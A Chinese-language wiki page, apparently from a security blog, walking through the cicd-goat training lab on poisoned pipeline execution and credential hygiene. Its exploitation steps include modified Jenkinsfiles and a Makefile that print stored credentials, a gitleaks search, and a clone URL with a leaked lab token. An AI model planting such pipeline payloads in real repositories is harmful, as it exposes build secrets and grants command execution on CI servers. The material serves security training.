<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-DevOpsAttack/cicd-goat/cicd-goat" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.1.0">
<title data-rh="true">通过 cicd-goat 靶场学习Top 10 CI/CD Security Risks 🦖 Whoopsunix</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://whoopsunix.com/docs/DevOpsAttack/cicd-goat/"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="通过 cicd-goat 靶场学习Top 10 CI/CD Security Risks 🦖 Whoopsunix"><meta data-rh="true" name="description" content="https://github.com/cider-security-research/cicd-goat"><meta data-rh="true" property="og:description" content="https://github.com/cider-security-research/cicd-goat"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://whoopsunix.com/docs/DevOpsAttack/cicd-goat/"><link data-rh="true" rel="alternate" href="https://whoopsunix.com/docs/DevOpsAttack/cicd-goat/" hreflang="en"><link data-rh="true" rel="alternate" href="https://whoopsunix.com/docs/DevOpsAttack/cicd-goat/" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="Whoopsunix RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="Whoopsunix Atom Feed"><link rel="stylesheet" href="/assets/css/styles.e447ecda.css">
<link rel="preload" href="/assets/js/runtime~main.ec66b09e.js" as="script">
<link rel="preload" href="/assets/js/main.da4bcc20.js" as="script">
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus">
<div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><b class="navbar__title text--truncate">Whoopsunix</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/PPPYSO/">WIKI</a><a class="navbar__item navbar__link" href="/blog">Blog</a><a class="navbar__item navbar__link" href="/docs/tags">Tag</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/Whoopsunix" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/docs/PPPYSO/">PPPYSO</a><button aria-label="Expand sidebar category &#x27;PPPYSO&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/docs/category/java-安全">Java 安全</a><button aria-label="Expand sidebar category &#x27;Java 安全&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/docs/components/">组件漏洞分析</a><button aria-label="Expand sidebar category &#x27;组件漏洞分析&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" aria-expanded="false" href="/docs/readTeam/">RT Attack</a><button aria-label="Expand sidebar category &#x27;RT Attack&#x27;" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" aria-expanded="true" href="/docs/DevOpsAttack/">DevOps Attack</a><button aria-label="Collapse sidebar category &#x27;DevOps Attack&#x27;" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/DevOpsAttack/cicd-goat/">通过 cicd-goat 靶场学习Top 10 CI/CD Security Risks</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-2 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/DevOpsAttack/Jenkins/">Jenkins Attack</a></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/docs/DevOpsAttack/"><span itemprop="name">DevOps Attack</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">通过 cicd-goat 靶场学习Top 10 CI/CD Security Risks</span><meta itemprop="position" content="2"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><h1>通过 cicd-goat 靶场学习Top 10 CI/CD Security Risks</h1>
<p><a href="https://github.com/cider-security-research/cicd-goat" target="_blank" rel="noopener noreferrer">https://github.com/cider-security-research/cicd-goat</a></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x01-cicd-sec-4-poisoned-pipeline-execution-ppe--white-rabbitd-ppe">0x01 <a href="https://www.cidersecurity.io/top-10-cicd-security-risks/poisoned-pipeline-execution-ppe/" target="_blank" rel="noopener noreferrer">CICD-SEC-4 Poisoned Pipeline Execution (PPE)</a>  White Rabbit(D-PPE)<a href="#0x01-cicd-sec-4-poisoned-pipeline-execution-ppe--white-rabbitd-ppe" class="hash-link" aria-label="Direct link to 0x01-cicd-sec-4-poisoned-pipeline-execution-ppe--white-rabbitd-ppe" title="Direct link to 0x01-cicd-sec-4-poisoned-pipeline-execution-ppe--white-rabbitd-ppe">​</a></h2>
<p>可以通过 admin ciderland5# 登录后台查看具体的配置</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="原理">原理<a href="#原理" class="hash-link" aria-label="Direct link to 原理" title="Direct link to 原理">​</a></h2>
<p>漏洞介绍：<a href="https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/?utm_source=github&amp;utm_medium=github_page&amp;utm_campaign=ci%2fcd%20goat_060422" target="_blank" rel="noopener noreferrer">https://www.cidersecurity.io/blog/research/ppe-poisoned-pipeline-execution/?utm_source=github&amp;utm_medium=github_page&amp;utm_campaign=ci%2fcd%20goat_060422</a></p>
<p>简单来说就是通过修改存储库中可控的 CI 管道配置文件达到执行命令的目的，Jenkinsfile（Jenkins）、.gitlab-ci.yml（GitLab）、.circleci/config.yml（CircleCI）、.github/workflowers 的 GitHub Actions YAML 文件这些都是 CI 配置文件。</p>
<p>PPE 主要有三种攻击方式：</p>
<ul>
<li><strong>Direct (D-PPE)</strong>：修改可访问的存储库中的 CI 配置文件后直接将更改推送到存储库上的一个未受保护的远程分支，或者通过从一个分支或分叉提交带有更改的 PR。由于 CI 管道的执行是由 push 或 PR 事件触发的，并且管道的执行是由修改后的 CI 配置文件中的命令定义的，攻击者的恶意命令最终在构建管道触发后在构建节点上运行。</li>
<li><strong>Indirect (I-PPE)</strong>：如果CI的流水线定义不是在代码仓库中的配置文件定义，而是在CI系统（Jenkins）自身定义的。仍然可以通过代码仓库中存在的文件进行恶意代码执行，如 Makefile 文件、管道中自定义执行的shell脚本。通过间接插入恶意代码到管道中执行的脚本，达到恶意代码植入。</li>
<li><strong>Public (P-PPE, or 3PE)</strong>：从公共的代码仓库拉取的代码，如果攻击者通过公共仓库进行投毒，会对CI系统造成破坏，如果CI系统在内网，甚至可能进一步危害内网安全。</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞复现">漏洞复现<a href="#漏洞复现" class="hash-link" aria-label="Direct link to 漏洞复现" title="Direct link to 漏洞复现">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="恶意-jenkinsfile-文件">恶意 Jenkinsfile 文件<a href="#恶意-jenkinsfile-文件" class="hash-link" aria-label="Direct link to 恶意 Jenkinsfile 文件" title="Direct link to 恶意 Jenkinsfile 文件">​</a></h3>
<p>访问 Gitea 的 <code>Wonderland/white-rabbit</code> 项目下有一个 Jenkinsfile 文件，修改如下，将获取名为 flag1 的凭据，并存储在 msg 环境变量中并输出</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pipeline {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    agent any</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    stages {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        stage (&#x27;poc&#x27;) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            steps {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                withCredentials([string(credentialsId: &#x27;flag1&#x27;, variable: &#x27;msg&#x27;)]) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    sh &#x27;&#x27;&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                        echo $msg | base64</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    &#x27;&#x27;&#x27;                 </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这里我们限制了 String 类型，所以实际凭证是需要符合 <code>org.jenkinsci.plugins.plaincredentials.StringCredentials</code> 这个类型的，Jenkins 支持的凭据见 <a href="https://www.jenkins.io/doc/book/using/using-credentials/" target="_blank" rel="noopener noreferrer">官方</a></p>
<p><img loading="lazy" alt="image-20240327175201062" src="/assets/images/image-20240327175201062-f5776c7b9bab8e7fa049bea40be4fd2e.png" width="594" height="288" class="img_ev3q"></p>
<p>举例说明，在 Jenkins-server 的 /var/jenkins_home/credentials.xml 文件存储的凭据是作用于全局的，不同的字段就对应的是 <code>withCredentials([string(</code>、<code>withCredentials([usernamePassword(</code> 这样的字段</p>
<p><img loading="lazy" alt="image-20240327114814291" src="/assets/images/image-20240327114814291-206fd4c19c64aa96dbf69483aed8ccdf.png" width="947" height="397" class="img_ev3q"></p>
<p>实际可以通过如下代码直接指定在可用节点  Jenkins-agent 执行命令</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pipeline {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    agent any</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    stages {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        stage (&#x27;poc&#x27;) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            steps {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                sh &quot;touch /tmp/pwn1.txt&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>还可以用 <code>agent {label &#x27;built-in&#x27;}</code> 指定在 Master 节点，即 Jenkins server 执行命令</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pipeline {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    agent {label &#x27;built-in&#x27;}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    stages {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        stage (&#x27;poc&#x27;) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            steps {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                sh &#x27;touch /tmp/pwn.txt&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这两个名字都是可以的</p>
<p><img loading="lazy" alt="image-20240328094238495" src="/assets/images/image-20240328094238495-68d41c7f5f3167dff29cf3d88f5a88b7.png" width="2078" height="1208" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="合并分支">合并分支<a href="#合并分支" class="hash-link" aria-label="Direct link to 合并分支" title="Direct link to 合并分支">​</a></h3>
<p>创建新分支并合并</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">git checkout -b poc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git add *</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git commit -m &quot;commit&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">git push -u origin poc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p> 之后来到 Jenkins 的 pipeline 构建过程查看结果 <a href="http://localhost:8080/view/all/builds" target="_blank" rel="noopener noreferrer">http://localhost:8080/view/all/builds</a></p>
<p><img loading="lazy" alt="image-20240327092817640" src="/assets/images/image-20240327092817640-e050ebf9c70726f01f3f1651ae9b1d6a.png" width="1048" height="339" class="img_ev3q"></p>
<p><img loading="lazy" alt="image-20240327114231425" src="/assets/images/image-20240327114231425-b352ac5a5314fd3b8c5fa3f5bbc4c719.png" width="571" height="247" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x02-mad-hatteri-ppe">0x02 Mad Hatter(I-PPE)<a href="#0x02-mad-hatteri-ppe" class="hash-link" aria-label="Direct link to 0x02 Mad Hatter(I-PPE)" title="Direct link to 0x02 Mad Hatter(I-PPE)">​</a></h2>
<p>mad-hatter 是两个库，pipeline 这个库没有权限操作，但在 <code>Wonderland/mad-hatter</code> 库中存在 Makefile，是一个 I-PPE 利用</p>
<p><img loading="lazy" alt="image-20240327153214707" src="/assets/images/image-20240327153214707-5a24b65ff59cd9f60a962a9e0c41c4f6.png" width="837" height="175" class="img_ev3q"></p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">abc:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	echo &quot;${FLAG}&quot; | base64</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x03-cicd-sec-6-insufficient-credential-hygiene-duchess">0x03 <a href="https://www.cidersecurity.io/top-10-cicd-security-risks/insufficient-credential-hygiene/" target="_blank" rel="noopener noreferrer">CICD-SEC-6 Insufficient Credential Hygiene</a> Duchess<a href="#0x03-cicd-sec-6-insufficient-credential-hygiene-duchess" class="hash-link" aria-label="Direct link to 0x03-cicd-sec-6-insufficient-credential-hygiene-duchess" title="Direct link to 0x03-cicd-sec-6-insufficient-credential-hygiene-duchess">​</a></h2>
<p>比较简单的一个 Git 存储库获取，用 <a href="https://github.com/gitleaks/gitleaks" target="_blank" rel="noopener noreferrer">gitleaks</a> 获取敏感信息</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gitleaks detect -v</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img loading="lazy" alt="image-20240327155320394" src="/assets/images/image-20240327155320394-268f1e0a3e31e445bd12b864613675ba.png" width="1866" height="324" class="img_ev3q"></p>
<p>这里显示不全，通过 <code>Fingerprint</code> 的 commit hash 使用 <code>git show &lt;commit-hash&gt;</code> 获取该历史记录。</p>
<p><img loading="lazy" alt="image-20240327155246213" src="/assets/images/image-20240327155246213-804fa602d964b39562e7ec865d996d7a.png" width="2602" height="588" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="0x04-caterpillar">0x04 Caterpillar<a href="#0x04-caterpillar" class="hash-link" aria-label="Direct link to 0x04 Caterpillar" title="Direct link to 0x04 Caterpillar">​</a></h2>
<p>同样是一个 PPE 的题目，先 fork Wonderland/caterpillar 仓库，修改 Jenkinsfile 后发起 <code>Pull Request</code> 请求，其他操作都是一样的了，执行 <code>env</code> 拿到 GITEA_TOKEN，执行拉取请求 <code>git clone http://5d3ed5564341d5060c8524c41fe03507e296ca46@localhost:3000/Wonderland/caterpillar.git</code></p>
<p><img loading="lazy" alt="image-20240327171748575" src="/assets/images/image-20240327171748575-71239e1ed678a76fa883097366d423be.png" width="2184" height="1062" class="img_ev3q"></p>
<p>拿到有权限的 token 后拉取仓库，之后构建利用 Jenkinsfile 获取 flag。</p>
<div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pipeline {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    agent any</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    stages {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        stage (&#x27;poc&#x27;) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          steps {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              withCredentials([usernamePassword(credentialsId: &#x27;flag2&#x27;, usernameVariable: &#x27;flag2&#x27;, passwordVariable: &#x27;TOKEN&#x27;)]) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                  sh &#x27;echo $TOKEN | base64&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">              }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">          }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 